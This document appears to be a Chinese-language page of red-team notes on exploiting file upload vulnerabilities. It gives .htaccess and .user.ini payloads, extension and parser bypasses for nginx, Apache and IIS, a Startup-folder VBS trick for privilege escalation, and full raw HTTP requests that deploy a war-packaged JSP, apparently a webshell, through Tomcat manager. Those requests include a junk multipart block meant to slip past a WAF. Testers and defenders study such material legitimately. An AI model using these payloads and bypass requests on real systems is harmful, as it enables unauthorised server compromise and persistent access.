# HVV/渗透测试常见的漏洞及利用方法

## 文件上传

>部分内容可能会和upload-labs里面的内容重复

### 无校验

传就完事了,但要注意上传的路径能不能解析该文件(把webshell传上去却发现没有解析...),有时候会发现传到OSS去了...

有时候一些上传点可以控制上传路径,可以尝试能不能进行路径穿越,把文件上传到其他目录

例如`C:\Users\用户名\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup`,传个vbs上去进行启动项提权

### 前端校验

burpsuite改就完事了

### 后端校验

#### MIME检查

要求`$_FILES['upload_file']['type']==='xxx'`,burpsuite改`content-type`就完事了

#### 文件后缀检查

##### 代码层面的黑名单

1. 黑名单是否完整,比如过滤`php`但没有过滤`phtml`,还可以尝试上传`.user.ini`或`.htaccess`

`.htaccess`如下

```
<FilesMatch "xxx.png">
SetHandler application/x-httpd-php
</FilesMatch>
```

```
AddType application/x-httpd-php .gif
```

`.user.ini`如下

```
auto_prepend_file = xxx.jpg
```

2. 大小写绕过,比如`PhP`或双写绕过,`pphphp`替换后得到`php`

3. windows平台特性

```
.php(空格)
.php.
.php::$DATA
```

4. `00`截断

5. 解析漏洞

>nginx

用户配置不当造成解析漏洞,增加`/.php`后缀,被解析为PHP文件

```
shell.png/.php
```

>apache httpd

- Apache解析文件的规则是从右到左开始判断解析,如果后缀名为不可识别文件解析,就再往左判断

`a.php.asdfqwer`解析为php

- CVE-2017-15715

上传`xxx.php\x0A`,访问`/1.php%0A`

>IIS6

- 在`.asp`和`.asa`目录下的任意文件都会解析成asp

- 服务器默认不解析`;`后面的内容

`asdf.asp;.jpg`会被解析为asp

- 罕见后缀

```
.asa
.cer
.cdx
```

>IIS7/7.5

类似于nginx解析漏洞

##### WAF层面的黑名单

1. 垃圾数据

- 在要上传的webshell中添加垃圾数据

- 利用`multipart/form-data`的特性,添加多个垃圾数据块,部分WAF存在无法处理多个数据块的情况

2. 畸形数据包

todo


---

以tomcat manager部署war包为例

```
POST /manager/html/upload;jsessionid=90151C6DAF8D510DF8E71D036D47F1F4?org.apache.catalina.filters.CSRF_NONCE=2812C24315E7A0FC3C55DB6D125DB7BC HTTP/1.1
Host: 192.168.89.129:8080
Content-Length: 1379
Cache-Control: max-age=0
Authorization: Basic dG9tY2F0OnRvbWNhdA==
Origin: http://192.168.89.129:8080
Upgrade-Insecure-Requests: 1
DNT: 1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryCYU5Y59MNL5BAit4
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://192.168.89.129:8080/manager/html
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: JSESSIONID=90151C6DAF8D510DF8E71D036D47F1F4
Connection: close

------WebKitFormBoundaryCYU5Y59MNL5BAit4
Content-Disposition: form-data; name="deployWar"; filename="bypass.war"
Content-Type: application/x-webarchive

PK��{U������������	��META-INF/���PK�����������PK��{U���������������META-INF/MANIFEST.MFMLK-.
K-*ϳR03r.JM,IMu	X)h%&*8%�krr�PKM7D���E���PK��]T���������������bp1.jspmTOkAStdllHWlBZ1KavwMvם4TU<x{[LƓ_D1d{/ۙkr$:Q+Ǹ֙(647L/F*W̼1q!73qk3)2D2ǽe<!d{E^GMvG+.\%q4yC\K5<hD9@8w.WkKlX2|*A9/|Tmp%5jpooNvSNǷO_><ڱ*`uơ1wy7|A\Jf۬pl$]#x5I2Ac)oK"3uQ+%ɄH2^#g@(\jnƇR9 ]bB3
L#g/WʗB-ã';oOQ"P+1'MeԲS
UxRMRMhJ2K2
+۲,Zr6ΗI;a0D9X3v&&'d׌h_;	c+b5	k	fBñv$5T(w?<lÏo`ӡ%td%\sIc6zuh' 	klK)fGtBXLfE
`+"`m2΢[6@spPKZV#o��d��PK���{U�����������	����������������META-INF/��PK���{UM7D���E����������������=���META-INF/MANIFEST.MFPK���]TZV#o��d������������������bp1.jspPK�������������
------WebKitFormBoundaryCYU5Y59MNL5BAit4--
```

WAF可能会检测以下几点

>filename

可能会对filename进行后缀名检查,绕过方法主要由两点:构造畸形的`Content-Disposition`或者构造特殊的filename

- 构造畸形的`Content-Disposition`

todo

- 构造特殊的filename

利用tomcat对filename中存在的`\`的特殊处理进行绕过

`org.apache.catalina.core.ApplicationPart#getSubmittedFileName`

```java
    public String getSubmittedFileName() {
        String fileName = null;
        String cd = this.getHeader("Content-Disposition");
        if (cd != null) {
            String cdl = cd.toLowerCase(Locale.ENGLISH);
            if (cdl.startsWith("form-data") || cdl.startsWith("attachment")) {
                ParameterParser paramParser = new ParameterParser();
                paramParser.setLowerCaseNames(true);
                Map<String, String> params = paramParser.parse(cd, ';');
                if (params.containsKey("filename")) {
                    fileName = (String)params.get("filename");
                    if (fileName != null) {
                        if (fileName.indexOf(92) > -1) {
                            fileName = HttpParser.unquote(fileName.trim());
                        } else {
                            fileName = fileName.trim();
                        }
                    } else {
                        fileName = "";
                    }
                }
            }
        }

        return fileName;
    }

    public static String unquote(String input) {
        if (input != null && input.length() >= 2) {
            byte start;
            int end;
            if (input.charAt(0) == '"') {
                start = 1;
                end = input.length() - 1;
            } else {
                start = 0;
                end = input.length();
            }

            StringBuilder result = new StringBuilder();

            for(int i = start; i < end; ++i) {
                char c = input.charAt(i);
                if (input.charAt(i) == '\\') {
                    ++i;
                    result.append(input.charAt(i));
                } else {
                    result.append(c);
                }
            }

            return result.toString();
        } else {
            return input;
        }
    }
```

tomcat会对filename中多余的`\`进行去除,假设传入的是`a\s\d\f\.w\a\r`进行去除后实际的filename为`asdf.war`

但是如果传入的是`asd\\f.war`去除只能够去除单个`\`,因此实际的filename为`asd\f.war`

>Content-Type

改就完事了

>文件内容特征

部分WAF会对文件内容特征进行检查,以war包为例

```
PK
META-INF/
META-INF/MANIFEST.MF
xxx.jsp
```

这些文件内容可以作为war包检测的特征,同时`PK`和`META-INF/`都位于文件内容的开头

由于war包的特殊性,不能像上传php的webshell那样构造`chunk-data<?php xxx>`这种形式的数据,会导致无法正常部署

因此需要利用`multipart/form-data`的特性,添加垃圾数据块,使WAF无法对war包进行检测,同时tomcat不对垃圾数据进行处理,顺利部署war包

样例如下

```
POST /manager/html/upload;jsessionid=90151C6DAF8D510DF8E71D036D47F1F4?org.apache.catalina.filters.CSRF_NONCE=2812C24315E7A0FC3C55DB6D125DB7BC HTTP/1.1
Host: 192.168.89.129:8080
Content-Length: 1379
Cache-Control: max-age=0
Authorization: Basic dG9tY2F0OnRvbWNhdA==
Origin: http://192.168.89.129:8080
Upgrade-Insecure-Requests: 1
DNT: 1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryCYU5Y59MNL5BAit4
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://192.168.89.129:8080/manager/html
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: JSESSIONID=90151C6DAF8D510DF8E71D036D47F1F4
Connection: close

------WebKitFormBoundaryCYU5Y59MNL5BAit4
Content-Disposition: form-data; name="asdf"; filename="qwer"
Content-Type: asdfqwer

aaaaaaaaaaaaaaaaaaaaaa
------WebKitFormBoundaryCYU5Y59MNL5BAit4
Content-Disposition: form-data; name="deployWar"; filename="bypass.war"
Content-Type: application/x-webarchive

PK��{U������������	��META-INF/���PK�����������PK��{U���������������META-INF/MANIFEST.MFMLK-.
K-*ϳR03r.JM,IMu	X)h%&*8%�krr�PKM7D���E���PK��]T���������������bp1.jspmTOkAStdllHWlBZ1KavwMvם4TU<x{[LƓ_D1d{/ۙkr$:Q+Ǹ֙(647L/F*W̼1q!73qk3)2D2ǽe<!d{E^GMvG+.\%q4yC\K5<hD9@8w.WkKlX2|*A9/|Tmp%5jpooNvSNǷO_><ڱ*`uơ1wy7|A\Jf۬pl$]#x5I2Ac)oK"3uQ+%ɄH2^#g@(\jnƇR9 ]bB3
L#g/WʗB-ã';oOQ"P+1'MeԲS
UxRMRMhJ2K2
+۲,Zr6ΗI;a0D9X3v&&'d׌h_;	c+b5	k	fBñv$5T(w?<lÏo`ӡ%td%\sIc6zuh' 	klK)fGtBXLfE
`+"`m2΢[6@spPKZV#o��d��PK���{U�����������	����������������META-INF/��PK���{UM7D���E����������������=���META-INF/MANIFEST.MFPK���]TZV#o��d������������������bp1.jspPK�������������
------WebKitFormBoundaryCYU5Y59MNL5BAit4--
```

当第一个垃圾数据块的长度超过WAF的处理能力时,部分的WAF会直接放行

![](https://img.mi3aka.eu.org/2022/08/e2c35ee5125a18195d99c3d81120f007.png)

![](https://img.mi3aka.eu.org/2022/08/877c0f42eda5391de3adcd6b954deeb9.png)




#### 白名单

### 文件内容检查

#### 文件头检查




## 常见组件

### ueditor

1. 查看版本

大部分文章提到的查看版本方法都是通过`help.js`中的`document.getElementById('version').innerHTML = parent.UE.version;`,在控制台中执行`console.log(UE.version)`来得到版本

但其实可以直接通过访问`ueditor.all.js`来得到当前版本号

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master//202207201814121.png)

2. net版本文件上传

```
1.gif?.aspx
1.gif?.a?s?p?x
```

